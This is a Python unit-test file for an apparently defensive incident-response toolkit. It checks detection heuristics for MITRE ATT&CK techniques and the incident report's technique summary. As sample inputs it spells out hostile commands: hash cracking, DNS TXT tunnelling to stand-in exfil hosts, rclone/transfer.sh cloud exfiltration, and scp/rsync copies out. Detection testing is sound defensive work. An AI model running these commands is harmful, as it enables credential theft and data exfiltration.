import unittest
import yaml
import re
import os
import json
from bluekit.ir.models import AttackChain, AttackStage, IncidentReportModel
from bluekit.ir.report import build_incident_model, render_scoring_json

class TestIRGaps2(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        path = os.path.join(os.path.dirname(__file__), '..', 'bluekit', 'kb', 'heuristics.yaml')
        with open(path, 'r', encoding='utf-8') as f:
            cls.heuristics = yaml.safe_load(f)

    def match_technique(self, text, tech_id):
        for h in self.heuristics:
            if tech_id in h.get('techniques', []):
                pat = h.get('pattern', '')
                if re.search(pat, text, re.IGNORECASE if '(?i)' in pat else 0):
                    return True
        return False

    def test_crack_pattern(self):
        self.assertTrue(self.match_technique("hashcat -m 13100 h.txt", "T1110.002"))
        self.assertTrue(self.match_technique("john --wordlist=w.txt h", "T1110.002"))
        self.assertFalse(self.match_technique("john.doe@corp.uz login", "T1110.002"))
        # 'john' foydalanuvchi nomi va boshqa vositalarning -m bayrog'i parol buzish emas
        self.assertFalse(self.match_technique("Accepted password for john from 10.0.0.5 port 22 ssh2", "T1110.002"))
        self.assertFalse(self.match_technique("curl -m 1000 https://example.com", "T1110.002"))
        self.assertTrue(self.match_technique("john.exe hashes.txt", "T1110.002"))

    def test_dns_tunnel_pattern(self):
        self.assertTrue(self.match_technique("dig TXT aGVsbG8gd29ybGQgaGVsbG8x.evil.example", "T1071.004"))
        self.assertTrue(self.match_technique("dig x7f3k2m9q1w8e4r6t5y0u.example.net TXT", "T1071.004"))
        self.assertTrue(self.match_technique("nslookup -type=txt mzxw6ytboi2dqmrs.ex.net", "T1071.004"))
        self.assertTrue(self.match_technique("dig TXT <base32>.exfil.example.net", "T1071.004"))
        self.assertFalse(self.match_technique("dig TXT example.com", "T1071.004"))
        self.assertFalse(self.match_technique("dig a.b TXT", "T1071.004"))
        self.assertFalse(self.match_technique("nslookup corp.local", "T1071.004"))

    def test_cloud_exfil_pattern(self):
        self.assertTrue(self.match_technique("rclone copy C:\\data remote:bkt", "T1567.002"))
        self.assertTrue(self.match_technique("curl -T f https://transfer.sh/f", "T1567.002"))
        self.assertFalse(self.match_technique("rclone version", "T1567.002"))

    def test_remote_copy_pattern(self):
        self.assertTrue(self.match_technique("scp -i k /tmp/d.tgz u@203.0.113.5:/x", "T1048"))
        self.assertTrue(self.match_technique("rsync -avz /data backup@srv:/b", "T1048"))
        self.assertFalse(self.match_technique("scp --help", "T1048"))
        self.assertFalse(self.match_technique("cp a b", "T1048"))

    def test_share_archive_pattern(self):
        self.assertTrue(self.match_technique("7z a out.7z \\\\fs01\\Projects\\x", "T1039"))
        self.assertTrue(self.match_technique("7z a out.7z Z:\\Projects", "T1039"))
        self.assertTrue(self.match_technique("robocopy \\\\fs\\share C:\\t /E", "T1039"))
        self.assertFalse(self.match_technique("7z a out.7z C:\\Users\\a\\Docs", "T1039"))

    def test_lateral_in_mitre_summary(self):
        s1 = AttackStage(stage_id=1, 
            timestamp="2026-10-02T10:00:00Z",
            host="A",
            phase="Execution",
            technique_id="T1059.001",
            technique_name="PowerShell",
            evidence="powershell.exe",
            iocs={},
            status="CONFIRMED",
            
        )
        s2 = AttackStage(stage_id=2, 
            timestamp="2026-10-02T10:05:00Z",
            host="B",
            phase="Execution",
            technique_id="T1059.001",
            technique_name="PowerShell",
            evidence="powershell.exe",
            iocs={},
            status="CONFIRMED",
            
        )
        
        chain = AttackChain(chain_id=1)
        chain.stages = [s1]
        chain.lateral_edges = [
            {"src_host": "A", "dst_host": "B", "techniques": ["T1078"], "status": "CONFIRMED"},
            {"src_host": "B", "dst_host": "C", "techniques": ["T1570", "T1059.001"], "status": "CONFIRMED"},
            {"src_host": "C", "dst_host": "D", "techniques": ["T1021.006"], "status": "SUSPECTED"}
        ]
        
        model = build_incident_model(chain, "test", 100)
        
        techs = {m["technique_id"]: m for m in model.mitre_summary}
        self.assertIn("T1078", techs)
        self.assertIn("T1570", techs)
        self.assertNotIn("T1021.006", techs)
        
        self.assertEqual(techs["T1059.001"]["occurrences"], 2)
        self.assertEqual(techs["T1059.001"]["phase"], "Execution")
        
        # Test unique technique IDs
        self.assertEqual(len(model.mitre_summary), len(techs))
        
        # Check phases
        try:
            from bluekit.kb.query import KB
            kb = KB()
            if kb:
                self.assertEqual(techs["T1570"]["phase"], "Lateral Movement")
                self.assertNotEqual(techs["T1078"]["phase"], "Lateral Movement")
        except Exception:
            pass
            
        scoring_json = json.loads(render_scoring_json(model))
        scoring_techs = [m["technique_id"] for m in scoring_json["mitre_attack_techniques"]]
        self.assertIn("T1078", scoring_techs)
        self.assertIn("T1570", scoring_techs)

if __name__ == '__main__':
    unittest.main()
